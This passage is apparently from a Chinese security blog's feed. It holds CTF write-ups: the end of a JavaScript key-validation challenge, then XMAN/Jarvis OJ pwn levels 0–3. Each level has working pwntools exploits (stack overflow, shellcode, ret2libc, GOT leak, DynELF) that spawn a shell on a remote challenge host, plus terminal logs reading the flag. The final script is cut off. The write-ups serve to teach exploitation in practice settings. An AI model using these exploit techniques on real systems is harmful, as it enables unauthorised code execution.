<p>弹框得到结果：OhLord4309111，得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FLAG-65t23674o6N2NehA44272G24</div></pre></td></tr></table></figure></p>
<h1 id="Valid-key-required"><a href="#Valid-key-required" class="headerlink" title="Valid key required"></a>Valid key required</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">		<span class="function"><span class="keyword">function</span> <span class="title">curry</span>(<span class="params"> orig_func </span>) </span>&#123;</div><div class="line">			<span class="keyword">var</span> ap = <span class="built_in">Array</span>.prototype, args = <span class="built_in">arguments</span>;</div><div class="line"></div><div class="line">			<span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>) </span>&#123;</div><div class="line">			ap.push.apply( fn.args, <span class="built_in">arguments</span> );</div><div class="line">			<span class="keyword">return</span> fn.args.length &lt; orig_func.length ? fn : orig_func.apply( <span class="keyword">this</span>, fn.args );</div><div class="line">			&#125;</div><div class="line"></div><div class="line">			<span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">			fn.args = ap.slice.call( args, <span class="number">1</span> );</div><div class="line">			<span class="keyword">return</span> fn.apply( <span class="keyword">this</span>, <span class="built_in">arguments</span> );</div><div class="line">			&#125;;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="function"><span class="keyword">function</span> <span class="title">callback</span>(<span class="params">x,y,i,a</span>) </span>&#123;</div><div class="line">		  <span class="keyword">return</span> !y.call(x, a[a[<span class="string">"length"</span>]<span class="number">-1</span>-i].toString().slice(<span class="number">19</span>,<span class="number">21</span>)) ? x : &#123;&#125;;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">var</span> ref = &#123;<span class="attr">T</span> : <span class="string">"BG8"</span>,<span class="attr">J</span> : <span class="string">"jep"</span>,<span class="attr">j</span> : <span class="string">"M2L"</span>,<span class="attr">K</span> : <span class="string">"L23"</span>,<span class="attr">H</span> : <span class="string">"r1A"</span>&#125;;</div><div class="line"></div><div class="line">		<span class="function"><span class="keyword">function</span> <span class="title">validatekey</span>(<span class="params"></span>)</span></div><div class="line">		&#123;</div><div class="line">			e = <span class="literal">false</span>;</div><div class="line">			<span class="keyword">var</span> _strKey = <span class="string">""</span>;</div><div class="line">		    <span class="keyword">try</span> &#123;</div><div class="line">				_strKey = <span class="built_in">document</span>.getElementById(<span class="string">"key"</span>).value;</div><div class="line">		        <span class="keyword">var</span> a = _strKey.split(<span class="string">"-"</span>);</div><div class="line">		        <span class="keyword">if</span>(a.length !== <span class="number">5</span>)</div><div class="line">		        	e = <span class="literal">true</span>;</div><div class="line"></div><div class="line">		        <span class="keyword">var</span> o=a.map(genFunc).reduceRight(callback, <span class="keyword">new</span> (genFunc(a[<span class="number">4</span>]))(<span class="built_in">Function</span>));</div><div class="line"></div><div class="line">		        <span class="keyword">if</span>(!equal(o,ref))</div><div class="line">					e = <span class="literal">true</span>;</div><div class="line"></div><div class="line">		    &#125;<span class="keyword">catch</span>(e)&#123;</div><div class="line">		    	e = <span class="literal">true</span>;</div><div class="line">		    &#125;</div><div class="line"></div><div class="line">		    <span class="keyword">if</span>(!e) &#123;</div><div class="line">		    	<span class="keyword">if</span>(<span class="built_in">document</span>.location.href.indexOf(<span class="string">"?p="</span>) == <span class="number">-1</span>) &#123;</div><div class="line">					<span class="built_in">document</span>.location = <span class="built_in">document</span>.location.href + <span class="string">"?p="</span> + _strKey;</div><div class="line">           		&#125;</div><div class="line">		    &#125; <span class="keyword">else</span> &#123;</div><div class="line">		    	$(<span class="string">"#cresponse"</span>).html(<span class="string">"&lt;div class='alert alert-danger'&gt;Wrong password sorry.&lt;/div&gt;"</span>);</div><div class="line">			&#125;   </div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="function"><span class="keyword">function</span> <span class="title">equal</span>(<span class="params">o,o1</span>)</span></div><div class="line">		&#123;</div><div class="line">		    <span class="keyword">var</span> keys1 = <span class="built_in">Object</span>.keys(o1);</div><div class="line">		    <span class="keyword">var</span> keys = <span class="built_in">Object</span>.keys(o);</div><div class="line">		    <span class="keyword">if</span>(keys1.length != keys.length)</div><div class="line">		        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line"></div><div class="line">		    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;keys.length;i++)</div><div class="line">		         <span class="keyword">if</span>(keys[i] != keys1[i] || o[keys[i]] != o1[keys1[i]])</div><div class="line">		            <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line"></div><div class="line">		    <span class="keyword">return</span> <span class="literal">true</span>;</div><div class="line"></div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="function"><span class="keyword">function</span> <span class="title">hook</span>(<span class="params">f1,f2,f3</span>) </span>&#123;</div><div class="line">		    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123; <span class="keyword">return</span> f2(f1(x),f3(x));&#125;;</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">var</span> h = curry(hook);</div><div class="line">		<span class="keyword">var</span> fn = h(<span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;<span class="keyword">return</span> x &gt;= <span class="number">48</span>;&#125;,<span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"return a &amp;&amp; b;"</span>));</div><div class="line">		<span class="function"><span class="keyword">function</span> <span class="title">genFunc</span>(<span class="params">_part</span>) </span>&#123;</div><div class="line">		    <span class="keyword">if</span>(!_part || !(_part.length) || _part.length !== <span class="number">4</span>)</div><div class="line">		        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;;</div><div class="line"></div><div class="line">		    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Function</span>(_part.substring(<span class="number">1</span>,<span class="number">3</span>), <span class="string">"this."</span> + _part[<span class="number">3</span>] + <span class="string">"="</span> + _part.slice(<span class="number">1</span>,<span class="number">3</span>) + <span class="string">"+"</span> + (fn(<span class="function"><span class="keyword">function</span>(<span class="params">y</span>)</span>&#123;<span class="keyword">return</span> y&lt;=<span class="number">57</span>&#125;)(_part.charCodeAt(<span class="number">0</span>)) ?  _part[<span class="number">0</span>] : <span class="string">"'"</span>+ _part[<span class="number">0</span>] + <span class="string">"'"</span>));</div><div class="line">		&#125;</div><div class="line">&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;未完待续..待续..&lt;br&gt;
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
      <category term="javascript" scheme="http://yoursite.com/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>XMAN-pwn-writeup</title>
    <link href="http://yoursite.com/2017/06/29/XMAN-pwn-writeup/"/>
    <id>http://yoursite.com/2017/06/29/XMAN-pwn-writeup/</id>
    <published>2017-06-29T03:05:08.000Z</published>
    <updated>2017-07-01T14:17:29.972Z</updated>
    
    <content type="html"><![CDATA[<p>web狗的二进制之路<br><a id="more"></a></p>
<h1 id="level-0-x64"><a href="#level-0-x64" class="headerlink" title="level 0 x64"></a>level 0 x64</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>main函数：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170629/9.jpg?raw=true" alt=""></p>
<p>vuln函数:<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170629/10.jpg?raw=true" alt=""></p>
<p>用strings可以看到，有/bin/sh，这样我们不用再去写入了。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170629/11.jpg?raw=true" alt=""></p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">p = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="number">9881</span>)</div><div class="line">elf = ELF(<span class="string">"./level0"</span>)</div><div class="line"></div><div class="line">offset = <span class="number">0x80</span> + <span class="number">8</span></div><div class="line">system_addr = elf.symbols[<span class="string">'system'</span>]</div><div class="line">sh_addr = next(elf.search(<span class="string">'/bin/sh'</span>))</div><div class="line">pop_rdi_ret_addr = <span class="number">0x0000000000400663</span></div><div class="line"></div><div class="line">payload = <span class="string">'a'</span> * offset</div><div class="line">payload += p64(pop_rdi_ret_addr)</div><div class="line">payload += p64(sh_addr)</div><div class="line">payload += p64(system_addr)</div><div class="line">p.send(payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">(venv) chybeta@ubuntu:~/pwn/ctf/xman/0$ python exp.py</div><div class="line">[+] Opening connection to pwn2.jarvisoj.com on port 9881: Done</div><div class="line">[*] &apos;/home/chybeta/pwn/ctf/xman/0/level0&apos;</div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    No RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE</div><div class="line">[*] Switching to interactive mode</div><div class="line">Hello, World</div><div class="line">$ ls</div><div class="line">flag</div><div class="line">level0_x64</div><div class="line">$ cat flag</div><div class="line">CTF&#123;713ca3944e92180e0ef03171981dcd41&#125;</div></pre></td></tr></table></figure>
<h1 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>main函数；<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170629/1.jpg?raw=true" alt=""></p>
<p>vulnerable_function函数：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170629/2.jpg?raw=true" alt=""></p>
<p>很明显的栈溢出漏洞。溢出点用pattern查出为140个字节。用checksec看后发现NX没有开启，可以插入shellcode。题目也给出了buf的地址。因此可以在buf数组中插入shellcode，然后再溢出跳转到buf的起始位置去执行shellcode。</p>
<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">p = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="number">9877</span>)</div><div class="line"><span class="comment"># p = process("./level1")</span></div><div class="line">elf = ELF(<span class="string">"./level1"</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">"What's this:"</span>)</div><div class="line">buf_addr = p.recvuntil(<span class="string">"?"</span>)[:<span class="number">-1</span>]</div><div class="line">buf_addr = int(buf_addr,<span class="number">16</span>)</div><div class="line"></div><div class="line">offset = <span class="number">140</span></div><div class="line"></div><div class="line">shellcode = asm(shellcraft.sh())</div><div class="line"></div><div class="line">payload = shellcode</div><div class="line">payload = payload.ljust(<span class="number">140</span>,<span class="string">'a'</span>)</div><div class="line">payload += p32(buf_addr)</div><div class="line"></div><div class="line">p.send(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<h2 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">(venv) chybeta@ubuntu:~/pwn/ctf/xman/xman1$ python exp.py</div><div class="line">[+] Opening connection to pwn2.jarvisoj.com on port 9877: Done</div><div class="line">[*] &apos;/home/chybeta/pwn/ctf/xman/xman1/level1&apos;</div><div class="line">    Arch:     i386-32-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX disabled</div><div class="line">    PIE:      No PIE</div><div class="line">[*] Switching to interactive mode</div><div class="line"></div><div class="line">$</div><div class="line">$ ls</div><div class="line">flag</div><div class="line">level1</div><div class="line">$ cat flag</div><div class="line">CTF&#123;82c2aa534a9dede9c3a0045d0fec8617&#125;</div></pre></td></tr></table></figure>
<h1 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h1><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>main函数<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170629/3.jpg?raw=true" alt=""></p>
<p>vulnerable_function函数：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170629/4.jpg?raw=true" alt=""></p>
<p>这题用strings查看时，会发现有/bin/sh字符串，不需要我们再去写入了。用gdb去调试，没成功，栈被重置了。不过从vuln函数里可以很清楚的看到，它先调用了一次system，而且read中存在栈溢出漏洞。而且buf的地址在<code>bp-88h</code>的位置。从内存的分布知道，当前栈帧的ebp再减去4个字节就是return的地址。所以溢出的offset同样是 <code>0x88 + 4</code>。所以这题的思路就是，覆盖返回地址，跳转到system，构造栈上的参数，给system传入sh/。</p>
<h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">p = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="number">9878</span>)</div><div class="line">elf = ELF(<span class="string">"./level2"</span>)</div><div class="line"></div><div class="line">offset = <span class="number">0x88</span> + <span class="number">4</span></div><div class="line">sh_addr = next(elf.search(<span class="string">'/bin/sh'</span>))</div><div class="line"></div><div class="line">payload = <span class="string">'a'</span> * offset</div><div class="line">payload += p32(elf.symbols[<span class="string">'system'</span>])</div><div class="line">payload += p32(<span class="number">1</span>) <span class="comment">#padding</span></div><div class="line">payload += p32(sh_addr)</div><div class="line"></div><div class="line">p.send(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<h2 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">(venv) chybeta@ubuntu:~/pwn/ctf/xman/2$ python exp.py</div><div class="line">[+] Opening connection to pwn2.jarvisoj.com on port 9878: Done</div><div class="line">[*] &apos;/home/chybeta/pwn/ctf/xman/2/level2&apos;</div><div class="line">    Arch:     i386-32-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE</div><div class="line">[*] Switching to interactive mode</div><div class="line">Input:</div><div class="line">$ ls</div><div class="line">flag</div><div class="line">level2</div><div class="line">$ cat flag</div><div class="line">CTF&#123;1759d0cbd854c54ffa886cd9df3a3d52&#125;</div><div class="line">$</div></pre></td></tr></table></figure>
<h1 id="level-2-x64"><a href="#level-2-x64" class="headerlink" title="level 2 x64"></a>level 2 x64</h1><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p>换成64位版本，参数要用rdi传递。binary中有sh字符串，直接利用就可以。这题似乎跟level0差不多啊。。</p>
<h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">p = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="number">9882</span>)</div><div class="line"><span class="comment"># p = process("./level2_x64")</span></div><div class="line">elf = ELF(<span class="string">"./level2_x64"</span>)</div><div class="line"></div><div class="line">offset = <span class="number">0x80</span> + <span class="number">8</span></div><div class="line">pop_rdi_ret_addr = <span class="number">0x00000000004006b3</span></div><div class="line">pop_rsi_pop_r15_ret_addr = <span class="number">0x00000000004006b1</span></div><div class="line"></div><div class="line">system_plt = elf.plt[<span class="string">'system'</span>]</div><div class="line">sh_addr = next(elf.search(<span class="string">"/bin/sh"</span>))</div><div class="line"></div><div class="line">payload = <span class="string">'a'</span> * offset</div><div class="line">payload += p64(pop_rdi_ret_addr)</div><div class="line">payload += p64(sh_addr)</div><div class="line">payload += p64(system_plt)</div><div class="line"></div><div class="line">p.send(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<h2 id="flag-3"><a href="#flag-3" class="headerlink" title="flag"></a>flag</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">(venv) chybeta@ubuntu:~/pwn/ctf/xman/2x64$ python exp.py</div><div class="line">[+] Opening connection to pwn2.jarvisoj.com on port 9882: Done</div><div class="line">[*] &apos;/home/chybeta/pwn/ctf/xman/2x64/level2_x64&apos;</div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    No RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE</div><div class="line">[*] Switching to interactive mode</div><div class="line">Input:</div><div class="line">$ ls</div><div class="line">flag</div><div class="line">level2_x64</div><div class="line">$ cat flag</div><div class="line">CTF&#123;081ecc7c8d658409eb43358dcc1cf446&#125;</div></pre></td></tr></table></figure>
<h1 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h1><h2 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h2><p>main函数跟前面一样。</p>
<p>vuln函数:<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170629/7.jpg?raw=true" alt=""></p>
<p>仍然是栈溢出。题目给了libc.so，这样我们就有偏移。利用write泄露出read的地址后计算出system和sh的地址，之后直接调用即可。</p>
<h2 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="number">9879</span>)</div><div class="line">elf = ELF(<span class="string">"./level3"</span>)</div><div class="line">libc = ELF(<span class="string">"./libc-2.19.so"</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</div><div class="line"></div><div class="line">offset = <span class="number">0x88</span> + <span class="number">4</span></div><div class="line">read_system_offset = libc.symbols[<span class="string">'read'</span>] - libc.symbols[<span class="string">'system'</span>]</div><div class="line">read_sh_offset = libc.symbols[<span class="string">'read'</span>] - next(libc.search(<span class="string">"/bin/sh"</span>))</div><div class="line">read_got = elf.got[<span class="string">'read'</span>]</div><div class="line">write_plt = elf.plt[<span class="string">'write'</span>]</div><div class="line">vuln_addr = elf.symbols[<span class="string">'vulnerable_function'</span>]</div><div class="line"></div><div class="line"></div><div class="line">payload = <span class="string">'a'</span> * offset</div><div class="line">payload += p32(write_plt)</div><div class="line">payload += p32(vuln_addr)</div><div class="line">payload += p32(<span class="number">1</span>)</div><div class="line">payload += p32(read_got)</div><div class="line">payload += p32(<span class="number">4</span>)</div><div class="line"></div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line">read_addr = u32(p.recv(<span class="number">4</span>))</div><div class="line">system_addr = read_addr - read_system_offset</div><div class="line">sh_addr = read_addr - read_sh_offset</div><div class="line">log.success(<span class="string">"system address =&gt; &#123;&#125;"</span>.format(hex(system_addr)))</div><div class="line">log.success(<span class="string">"sh address =&gt; &#123;&#125;"</span>.format(hex(sh_addr)))</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</div><div class="line">payload = <span class="string">'a'</span> * offset</div><div class="line">payload += p32(system_addr)</div><div class="line">payload += p32(<span class="number">0xdeadbeef</span>)</div><div class="line">payload += p32(sh_addr)</div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<h2 id="flag-4"><a href="#flag-4" class="headerlink" title="flag"></a>flag</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">(venv) chybeta@ubuntu:~/pwn/ctf/xman/3$ python exp.py</div><div class="line">[+] Opening connection to pwn2.jarvisoj.com on port 9879: Done</div><div class="line">[*] &apos;/home/chybeta/pwn/ctf/xman/3/level3&apos;</div><div class="line">    Arch:     i386-32-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE</div><div class="line">[*] &apos;/home/chybeta/pwn/ctf/xman/3/libc-2.19.so&apos;</div><div class="line">    Arch:     i386-32-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      PIE enabled</div><div class="line">[+] system address =&gt; 0xf763a310</div><div class="line">[+] sh address =&gt; 0xf775a84c</div><div class="line">[*] Switching to interactive mode</div><div class="line">$ ls</div><div class="line">flag</div><div class="line">level3</div><div class="line">$ cat flag</div><div class="line">CTF&#123;d85346df5770f56f69025bc3f5f1d3d0&#125;</div><div class="line">$</div></pre></td></tr></table></figure>
<h2 id="exp（无libc版本）"><a href="#exp（无libc版本）" class="headerlink" title="exp（无libc版本）"></a>exp（无libc版本）</h2><p>假设题目没有给libc的话，可以用下面这个exp：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="comment">#p = process("./level3")</span></div><div class="line">p = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="number">9879</span>)</div><div class="line"><span class="comment"># p = remote("127.0.0.1",12345)</span></div><div class="line">elf = ELF(<span class="string">"./level3"</span>)</div><div class="line"></div><div class="line">pop3addr = <span class="number">0x08048519</span></div><div class="line">offset = <span class="number">0x88</span> + <span class="number">4</span></div><div class="line">bss_addr = elf.bss() + <span class="number">0x20</span></div><div class="line">read_plt = elf.plt[<span class="string">'read'</span>]</div><div class="line">write_plt = elf.plt[<span class="string">'write'</span>]</div><div class="line">vuln_addr = elf.symbols[<span class="string">'vulnerable_function'</span>]</div><div class="line">start_addr = elf.symbols[<span class="string">'_start'</span>]</div><div class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></div><div class="line">	log.info(<span class="string">"leaking address =&gt; &#123;&#125;"</span>.format(hex(address)))</div><div class="line">	p.recvuntil(<span class="string">"Input:\n"</span>)</div><div class="line">	payload = <span class="string">'a'</span> * offset</div><div class="line">	payload += p32(write_plt)</div><div class="line">	payload += p32(pop3addr)</div><div class="line">	payload += p32(<span class="number">1</span>)</div><div class="line">	payload += p32(address)</div><div class="line">	payload += p32(<span class="number">4</span>)</div><div class="line">	payload += p32(main_addr)</div><div class="line">	p.sendline(payload)</div><div class="line">	address = p.recv(<span class="number">4</span>)</div><div class="line">	<span class="keyword">return</span> address</div><div class="line"></div><div class="line">d = DynELF(leak, elf=ELF(<span class="string">"./level3"</span>))</div><div class="line">system_addr = d.lookup(<span class="string">"system"</span>,<span class="string">"libc"</span>)</div><div class="line">log.success(<span class="string">"system address =&gt; &#123;&#125;"</span>.format(hex(system_addr)))</div><div class="line"></div><div class="line">sh = <span class="string">"/bin/sh\x00"</span></div><div class="line">payload = <span class="string">'a'</span> * offset</div><div class="line">payload += p32(read_plt)</div><div class="line">payload += p32(pop3addr)</div><div class="line">payload += p32(<span class="number">0</span>)</div><div class="line">payload += p32(bss_addr)</div><div class="line">payload += p32(<span class="number">100</span>)</div><div class="line"><span class="comment"># payload +=</span></div><div class="line">payload += p32(system_addr)</div><div 